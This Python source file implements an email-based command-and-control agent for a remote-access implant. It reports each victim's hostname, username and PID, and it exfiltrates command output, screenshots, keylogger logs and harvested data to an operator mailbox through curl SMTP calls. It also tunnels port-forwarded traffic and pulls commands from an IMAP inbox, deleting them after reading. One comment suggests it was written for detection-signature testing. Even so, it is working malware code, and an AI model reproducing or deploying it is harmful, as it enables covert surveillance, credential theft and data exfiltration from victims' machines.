import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random

import queue

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

import threading

from localAgent import LocalAgent

class SimpleEmail:
	def __init__(self, sender, subject, body):
		self.sender = sender
		self.subject = subject
		self.body = body        

class EMailAgent(LocalAgent):
	OUTGOING_EMAIL_TMP_FILENAME = "tmp.txt";
	EMAIL_OUTGOING_URL = "FILL";
	IMAP_EMAIL_URL = "FILL";
	EMAIL_OUTGOING_USERNAME = "FILL";
	EMAIL_OUTGOING_PASSWORD = "FILL";
	EMAIL_CMD_ADDR = "FILL";

	EMAIL_PROTOCOL_TAG = "SMTP";

	SCREENSHOT_EMAIL_TAG = "Screenshot: ";
	KEYLOGGER_EMAIL_TAG = "Keylogger: ";
	PORTFORWARD_EMAIL_TAG = "PortForward: "
	HARVEST_EMAIL_TAG = "HARVEST";
	PROTOCOL_TAG = "PROTOCOL";
	USERNAME_TAG = "USERNAME";
	HOSTNAME_TAG = "HOSTNAME";
	PID_TAG = "PID";

	hostname = socket.gethostname()
	pid = os.getpid()
	username = getpass.getuser()

	q = queue.Queue()
	forwardQueues = {}
    
	curlLock = threading.Lock()

	def __init__(self):
		LocalAgent.__init__(self)

	def pushSocksForward(self, forwardID, data):
		self.pushForward(forwardID, data)

	def pushForward(self, forwardID, data):
		if not forwardID in self.forwardQueues:
			self.forwardQueues[forwardID] = queue.Queue()
		im_b64 = base64.b64encode(data).decode('ascii')
		subject = self.PORTFORWARD_EMAIL_TAG + forwardID + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
		self.sendEmail(subject, im_b64);

	def processNextEmail(self):
		try:
			self.curlLock.acquire()
			email = self.getNextEmail()
			self.curlLock.release()
			if(email.subject.startswith(self.PORTFORWARD_EMAIL_TAG)):
				elements = email.subject.split(" ")
				forwardID = elements[1]
				self.forwardQueues[forwardID].put(email.body)
			else:
				self.q.put(email.body)
		except Exception as e:
			#print("Oops, something went wrong in processNextEmail: {}".format(e), file=sys.stderr)
			self.curlLock.release()
			return "No email"

	def pollSocksForward(self, forwardID):
		return self.pollForward(forwardID)

	def pollForward(self, forwardID):
		if not forwardID in self.forwardQueues:
			self.forwardQueues[forwardID] = queue.Queue()
		if self.forwardQueues[forwardID].empty():
			self.processNextEmail()
		if self.forwardQueues[forwardID].empty():
			return None
		else:
			b64Forward = self.forwardQueues[forwardID].get()
			#print(b64Forward)
			return base64.decodebytes(b64Forward.encode('ascii'))    

	def buildEmailSubject(self, hostname, username, pid, protocol):
		return self.HOSTNAME_TAG + ":" + hostname + " " + self.USERNAME_TAG + ":" + username + " " +self.PROTOCOL_TAG + ":" +protocol + " " + self.PID_TAG + ":" + str(pid);
	
	def sendEmail(self, subject, body):
		#body = body.replace("\r", "")
		self.curlLock.acquire()
		f = open(self.OUTGOING_EMAIL_TMP_FILENAME, "w", newline='')
		f.write("From: \"" + self.EMAIL_OUTGOING_USERNAME + "\" <" + self.EMAIL_OUTGOING_USERNAME + ">" + "\n")
		f.write("To: \"" + self.EMAIL_CMD_ADDR + "\" <" + self.EMAIL_CMD_ADDR + ">" + "\n")
		f.write("Subject: " + subject + "\n\n")
		f.write(body)    
		f.close()
		sendEmailCommand = "curl --url " + self.EMAIL_OUTGOING_URL + " --user " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --mail-from " + self.EMAIL_OUTGOING_USERNAME + " --mail-rcpt " + self.EMAIL_CMD_ADDR + " --upload-file " + self.OUTGOING_EMAIL_TMP_FILENAME
		processTmp = subprocess.Popen(sendEmailCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		sendEmailResponseErr = processTmp.stderr.read().decode("utf-8")
		#Data lossyness is considered acceptable. If this code is ever used for something other than signature generation, IE, if persistence
        #of data is ever actually important, then some sort of queuing mechanism will be necessary to ensure data is not lost.
        #For now, fix the connection problem and restart the test scenario.
		if "curl: (" in sendEmailResponseErr:
			print("Cannot transmit email: " + sendEmailResponseErr)
		os.remove(self.OUTGOING_EMAIL_TMP_FILENAME)
		self.curlLock.release()
	
	def getScriptName(self):
		return os.path.realpath(__file__) 
        
	def postResponse(self, cmd_output):
		print("Sending: " + cmd_output)
		self.sendEmail(self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG), cmd_output);
        
	def postScreenshot(self, cmd_output):
		subject = self.SCREENSHOT_EMAIL_TAG + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
		self.sendEmail(subject, cmd_output);
			
	def postHarvest(self, cmd_output, harvestType):
		subject = self.HARVEST_EMAIL_TAG + ":" + harvestType + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
		self.sendEmail(subject, cmd_output);
	
	def getNextEmail(self):
		grabUIDInference = "curl " + self.IMAP_EMAIL_URL + "/inbox -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --request \"EXAMINE INBOX\""
		cmd_output = subprocess.Popen(grabUIDInference, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
		if not cmd_output:
			raise
		lines = cmd_output.split("\n")
		if(len(lines) < 8):
			raise
		current_messages = int(lines[3].split()[1])
		next_UID = lines[7].split()[3]
		next_UID = next_UID[:-1]#Remove last character
		next_UID = int(next_UID)
		tUID = next_UID - current_messages
        
		grabMeta = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
		cmd_output = subprocess.Popen(grabMeta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
		if not cmd_output:
			raise
	
		sender = ""
		subject = ""
		FROM = "From: ";
		SUBJECT = "Subject: ";
		found = False;
		for line in cmd_output.splitlines():
			if line.startswith(FROM):
				sender = line[len(FROM):]
				found = True
			elif line.startswith(SUBJECT):
				subject = line[len(SUBJECT):];            
		if not found:
			raise
    
		#Get Body
		getFirstEmailBodyCmd =  "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + "/;SECTION=TEXT -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
		body = subprocess.Popen(getFirstEmailBodyCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
		if "=3D" in body:
			body = body.replace("=\r\n", "")
			body = body.replace("=3D", "=")
		if (body[len(body) - 1] == '\n'):
			body = body[0: len(body) - 1];
		if (body[len(body) - 1] == '\r'):
			body = body[0: len(body) - 1];

		delCmdOne = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"STORE 1 +Flags \\Deleted\""
	
		#To delete, two step process:
		delCmdOneResponse = subprocess.Popen(delCmdOne, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
	
		delCmdTwo = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=" + str(tUID) + " -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"EXPUNGE\""
		delCmdTwoResponse = subprocess.Popen(delCmdTwo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode("utf-8")
	
		return SimpleEmail(sender, subject, body);    
    
	def pollServer(self):
		if self.q.empty():
			self.processNextEmail()
		if self.q.empty():
			return "<control> No Command"
		else:
			return self.q.get()
		

	def postKeylogger(self, log):
		subject = "Keylogger: " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG)
		self.sendEmail(subject, log);

try:
	agent = EMailAgent()
	agent.postResponse("Daemon alive")
	agent.run(True)
except Exception as e:
	print("Oops, something went wrong: {}".format(e), file=sys.stderr)    